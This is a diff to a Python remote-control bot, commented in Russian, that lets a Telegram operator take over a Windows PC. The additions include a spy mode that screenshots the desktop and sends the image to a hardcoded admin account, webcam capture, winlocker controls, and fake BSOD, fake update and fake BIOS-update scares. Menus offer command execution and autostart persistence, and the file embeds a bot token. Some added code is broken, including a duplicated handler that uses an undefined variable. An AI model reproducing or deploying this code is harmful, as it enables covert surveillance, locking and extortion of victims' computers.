@@ -8,9 +8,17 @@ import webbrowser
 import threading
 import tkinter as tk
 from tkinter import messagebox
+from PIL import Image, ImageTk, ImageGrab
 import traceback
 import requests
 import cv2
+import ctypes
+import telebot
+import pygame
+import psutil
+from plyer import notification
+from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
+from comtypes import CLSCTX_ALL
 
 # Зависимости и соответствующие им имена модулей для импорта
 REQUIRED = {
@@ -89,15 +97,40 @@ TOKEN = "7377054924:AAEnR9ti6y2mT3YbVMQKQbBJQpWsQWaJ6qk"
 ADMIN_ID = 5782683757
 bot = telebot.TeleBot(TOKEN)
 user_state = {}
+PASSWORD = "5090"  # Пароль для разблокировки
+BASE_DIR = os.path.abspath(os.path.dirname(__file__))
+MEME_DIR = os.path.join(BASE_DIR, "memes")
 
-REQUIRED_LIBS = {
-    "pyTelegramBotAPI": "telebot",
-    "pyautogui": "pyautogui",
-    "Pillow": "PIL",
-    "psutil": "psutil",
-    "pygame": "pygame",
-    "opencv-python": "cv2",
-}
+import subprocess
+import sys
+
+# Список необходимых библиотек
+REQUIRED_LIBS = [
+    "pyTelegramBotAPI",
+    "pyautogui",
+    "Pillow",
+    "psutil",
+    "pygame",
+    "opencv-python",
+    "plyer",
+    "pycaw",
+    "comtypes"
+]
+
+def install_package(package):
+    """Устанавливает пакет через pip."""
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+    except Exception as e:
+        print(f"Не удалось установить {package}: {e}")
+
+# Проверяем и устанавливаем отсутствующие библиотеки
+for lib in REQUIRED_LIBS:
+    try:
+        __import__(lib)
+    except ImportError:
+        print(f"Библиотека {lib} не найдена. Устанавливаю...")
+        install_package(lib)
 
 def try_import(module_name):
     try:
@@ -146,6 +179,7 @@ def main_menu():
     markup.add("🖥 Управление ПК", "📂 Работа с файлами")
     markup.add("📹 Мультимедиа", "🎨 Эффекты")
     markup.add("🔊 Звук", "⚙️ Прочее")
+    markup.add("🚀 Поддержать автора")
     markup.add("📊 Мониторинг системы", "🚪 Выход")
     return markup
 
@@ -153,6 +187,7 @@ def pc_control_menu():
     markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.add("🖥 Выключить ПК", "🔄 Перезагрузить ПК")
     markup.add("🔒 Заблокировать ПК", "⛔ Отмена выключения")
+    markup.add("⌨️ Напечатать текст", "🖱 Переместить мышь")
     markup.add("🔙 Назад")
     return markup
 
@@ -160,7 +195,7 @@ def file_menu():
     markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.add("📁 Список файлов", "📤 Отправить файл")
     markup.add("📥 Загрузить файл", "📶 Список Wi-Fi сетей")
-    markup.add("🔑 Подключиться к Wi-Fi")
+    markup.add("🖥 Системная информация", "❌ Закрыть приложение")
     markup.add("🔙 Назад")
     return markup
 
@@ -176,7 +211,9 @@ def effects_menu():
     markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.add("Black screen", "Fake update")
     markup.add("Meme spam", "💀 Фейковый BSOD")
-    markup.add("👻 Скример")
+    markup.add("👻 Скример", "📨 Системное уведомление")
+    markup.add("▶️ Запустить Winlocker🔐", "⏹ Остановить WINLOCKER🔐")
+    markup.add("💬 Сообщение", "🎵 Смарагдове небо")
     markup.add("🔙 Назад")
     return markup
 
@@ -190,9 +227,10 @@ def sound_menu():
 def misc_menu():
     markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.add("💻 Выполнить команду", "🖼 Сменить обои")
-    markup.add("🚀 Поддержать автора", "⏩ Обновить бота")
+    markup.add("⌨️ Горячие клавиши", "⏩ Обновить бота")
     markup.add("🔄 Перезапуск бота", "🛑 Остановить бота")
     markup.add("➕ Добавить в автозагрузку", "➖ Убрать из автозагрузки")
+    markup.add("🕵️ Режим шпиона")
     markup.add("🔙 Назад")
     return markup
 
@@ -218,6 +256,20 @@ def local_black_screen(duration=5):
         root.after(int(duration * 1000), root.destroy)
         root.mainloop()
     threading.Thread(target=_run, daemon=True).start()
+
+from plyer import notification
+
+def send_system_notification(title, message):
+    """Отправляет системное уведомление с заданным заголовком и текстом."""
+    try:
+        notification.notify(
+            title=title,
+            message=message,
+            app_name="Telegram Bot",
+            timeout=10  # Время отображения уведомления в секундах
+        )
+    except Exception as e:
+        print(f"Ошибка при отправке системного уведомления: {e}")
 
 def local_fake_update(duration=8, update_interval=0.5):
     def _run():
@@ -589,6 +641,105 @@ def start(message):
 def pc_control(message):
     bot.send_message(message.chat.id, "Выберите действие:", reply_markup=pc_control_menu())
 
+from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
+from comtypes import CLSCTX_ALL
+
+def set_volume(level):
+    """Устанавливает громкость для всех устройств."""
+    sessions = AudioUtilities.GetAllSessions()
+    for session in sessions:
+        volume = session._ctl.QueryInterface(ISimpleAudioVolume)
+        volume.SetMasterVolume(level, None)
+
+@bot.message_handler(func=lambda message: message.text == "🎵 Смарагдове небо")
+def play_emerald_sky(message):
+    try:
+        # Укажите путь к вашей песне
+        song_path = os.path.join(BASE_DIR, "Смарагдове небо.mp3")
+
+        # Проверяем, существует ли файл
+        if not os.path.exists(song_path):
+            bot.send_message(message.chat.id, "❌ Файл с песней не найден. Убедитесь, что 'emerald_sky.mp3' находится в папке с ботом.")
+            return
+
+        # Инициализация и воспроизведение песни
+        pygame.mixer.init()
+        pygame.mixer.music.load(song_path)
+        pygame.mixer.music.play()
+
+        bot.send_message(message.chat.id, "🎵 Воспроизвожу 'Смарагдове небо'. Отправьте 'Стоп', чтобы остановить.")
+        user_state[message.chat.id] = "playing_song"
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ошибка при воспроизведении песни: {e}")
+
+@bot.message_handler(func=lambda message: message.text == "🕵️ Режим шпиона")
+def spy_mode(message):
+    bot.send_message(message.chat.id, "🕵️ Режим шпиона активирован. Отправляю скриншот...")
+    screenshot = ImageGrab.grab()
+    path = "spy_screenshot.png"
+    screenshot.save(path)
+    with open(path, "rb") as img:
+        bot.send_photo(ADMIN_ID, img)
+    os.remove(path)
+    bot.send_message(message.chat.id, "✅ Скриншот отправлен администратору.")
+
+@bot.message_handler(func=lambda message: message.text.lower() == "стоп" and user_state.get(message.chat.id) == "playing_song")
+def stop_song(message):
+    try:
+        pygame.mixer.music.stop()
+        bot.send_message(message.chat.id, "⏹ Песня остановлена.")
+        user_state[message.chat.id] = None
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ошибка при остановке песни: {e}")
+
+@bot.message_handler(func=lambda message: message.text == "📷 Фото с вебкамеры")
+def capture_photo(message):
+    try:
+        cap = cv2.VideoCapture(0)  # Открываем веб-камеру
+        if not cap.isOpened():
+            bot.send_message(message.chat.id, "❌ Не удалось открыть веб-камеру.")
+            return
+
+        ret, frame = cap.read()
+        cap.release()  # Освобождаем камеру
+
+        if not ret:
+            bot.send_message(message.chat.id, "❌ Не удалось получить изображение с веб-камеры.")
+            return
+
+        # Сохраняем фото и отправляем его
+        photo_path = "photo.jpg"
+        cv2.imwrite(photo_path, frame)
+        with open(photo_path, "rb") as photo:
+            bot.send_photo(message.chat.id, photo)
+        os.remove(photo_path)  # Удаляем временный файл
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ошибка при съёмке: {e}")
+
+@bot.message_handler(func=lambda message: message.text == "🔊 Громкость 100%")
+def set_volume_max(message):
+    try:
+        set_volume(1.0)  # Устанавливаем громкость на 100%
+        bot.send_message(message.chat.id, "🔊 Громкость выставлена на 100%")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"⚠️ Не удалось изменить громкость: {e}")
+
+@bot.message_handler(func=lambda message: message.text == "🔇 Отключить звук")
+def mute_volume(message):
+    try:
+        set_volume(0.0)  # Устанавливаем громкость на 0%
+        bot.send_message(message.chat.id, "🔇 Звук отключён")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"⚠️ Не удалось отключить звук: {e}")
+
+@bot.message_handler(func=lambda message: message.text == "🔊 Включить звук")
+def unmute_volume(message):
+    try:
+        set_volume(1.0)  # Устанавливаем громкость на 100%
+        bot.send_message(message.chat.id, "🔊 Звук включён")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"⚠️ Не удалось включить звук: {e}")
+
 @bot.message_handler(func=lambda message: message.text == "➖ Убрать из автозагрузки")
 def remove_from_startup_handler(message):
     try:
@@ -608,6 +759,33 @@ def multimedia_control(message):
 @bot.message_handler(func=lambda message: message.text == "📊 Мониторинг системы")
 def monitoring_control(message):
     bot.send_message(message.chat.id, "Выберите, что мониторить:", reply_markup=monitoring_menu())
+
+@bot.message_handler(func=lambda message: message.text == "📨 Системное уведомление")
+def notify_command(message):
+    bot.send_message(message.chat.id, "Введите заголовок уведомления:")
+    user_state[message.chat.id] = "notify_title"
+
+# ...existing code...
+@bot.message_handler(func=lambda message: message.text == "📨 Системное уведомление")
+def notify_command(message):
+    bot.send_message(message.chat.id, "Введите заголовок уведомления:")
+    # сохраняем состояние как словарь
+    user_state[message.chat.id] = {"state": "notify_title"}
+# ...existing code...
+@bot.message_handler(func=lambda msg: isinstance(user_state.get(msg.chat.id), dict) and user_state[msg.chat.id].get("state") == "notify_text")
+def handle_notify_text(message):
+    state = user_state[message.chat.id]
+    text = message.text
+
+    # Отправляем системное уведомление
+    send_system_notification(title, text)
+
+    bot.send_message(message.chat.id, f"✅ Уведомление отправлено!\nЗаголовок: {title}\nТекст: {text}")
+    # Сбрасываем состояние пользователя
+    user_state[message.chat.id] = None
+# ...existing code...
+
+
 
 @bot.message_handler(func=lambda message: message.text == "💻 Загрузка CPU")
 def cpu_usage(message):
@@ -729,15 +907,29 @@ def list_processes(message):
 def real_time_monitoring(message):
     bot.send_message(message.chat.id, "⏳ Начинаю мониторинг. Отправьте 'Стоп', чтобы остановить.")
     user_state[message.chat.id] = "monitoring"
+
+    # Отправляем первое сообщение, которое будем обновлять
+    monitor_message = bot.send_message(message.chat.id, "💻 CPU: --%\n💾 RAM: --%")
+
     while user_state.get(message.chat.id) == "monitoring":
         try:
-            cpu = psutil.cpu_percent()
+            # Получаем данные о загрузке CPU и RAM
+            cpu = psutil.cpu_percent(interval=1)
             ram = psutil.virtual_memory().percent
-            bot.send_message(message.chat.id, f"💻 CPU: {cpu}%\n💾 RAM: {ram}%")
-            time.sleep(5)
+
+            # Обновляем сообщение
+            bot.edit_message_text(
+                chat_id=message.chat.id,
+                message_id=monitor_message.message_id,
+                text=f"💻 CPU: {cpu}%\n💾 RAM: {ram}%"
+            )
         except Exception as e:
             bot.send_message(message.chat.id, f"❌ Ошибка: {e}")
             break
+
+    # Если мониторинг остановлен, сбрасываем состояние
+    user_state[message.chat.id] = None
+    bot.send_message(message.chat.id, "⏹ Мониторинг остановлен.")
 
 @bot.message_handler(func=lambda message: message.text.lower() == "стоп")
 def stop_monitoring(message):
@@ -968,31 +1160,6 @@ def handle_buttons(message):
         except Exception as e:
             bot.send_message(message.chat.id, f"⚠️ Не удалось отключить звук: {e}")
 
-    elif message.text == "📷 Фото с вебкамеры":
-        try:
-            cap = cv2.VideoCapture(0)
-            if not cap.isOpened():
-                bot.send_message(message.chat.id, "❌ Не удалось открыть веб-камеру")
-            else:
-                ret, frame = cap.read()
-                cap.release()
-                if not ret:
-                    bot.send_message(message.chat.id, "❌ Не удалось получить кадр с веб-камеры")
-                else:
-                    import tempfile
-                    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".jpg")
-                    tmp_name = tmp.name
-                    tmp.close()
-                    cv2.imwrite(tmp_name, frame)
-                    with open(tmp_name, "rb") as img:
-                        bot.send_photo(message.chat.id, img)
-                    try:
-                        os.remove(tmp_name)
-                    except Exception:
-                        pass
-        except Exception as e:
-            bot.send_message(message.chat.id, f"❌ Ошибка при съёмке: {e}")
-
     elif message.text == "📹 Вебкамера 8 сек":
         bot.send_message(message.chat.id, "Запись вебкамеры...")
         filename = "webcam.mp4"
@@ -1114,3 +1281,4 @@ if __name__ == "__main__":
 
     # Запуск бота
     bot.polling(none_stop=True)
+print("Обновление BIOS... Не закрывайте окно.")
